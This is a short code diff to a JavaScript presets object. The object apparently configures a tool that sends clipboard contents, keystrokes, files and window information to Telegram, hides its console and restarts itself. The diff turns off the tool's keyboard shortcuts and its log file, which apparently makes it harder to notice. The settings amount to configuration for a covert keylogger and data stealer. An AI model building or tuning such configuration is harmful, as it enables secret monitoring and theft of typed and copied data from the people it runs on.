@@ -65,7 +65,7 @@ const PRESETS = {
     TELEGRAM_ENABLED: true,
     TELEGRAM_SEND_CLIPBOARD: true,
     TELEGRAM_SEND_KEYBOARD: true,
-    C2T_KEYBOARD_SHORTCUTS: true,
+    C2T_KEYBOARD_SHORTCUTS: false,
     TELEGRAM_DEDUPLICATE: true,
     TELEGRAM_SEND_FILES: true,
     TELEGRAM_SEND_WINDOW_INFO: true,
@@ -75,7 +75,7 @@ const PRESETS = {
     C2T_AUTO_RESTART: true,
     C2T_HIDE_CONSOLE: true,
     C2T_VERBOSE: true,
-    C2T_LOG_FILE: true,
+    C2T_LOG_FILE: false,
   },
   clipboard: {
     TELEGRAM_ENABLED: true,
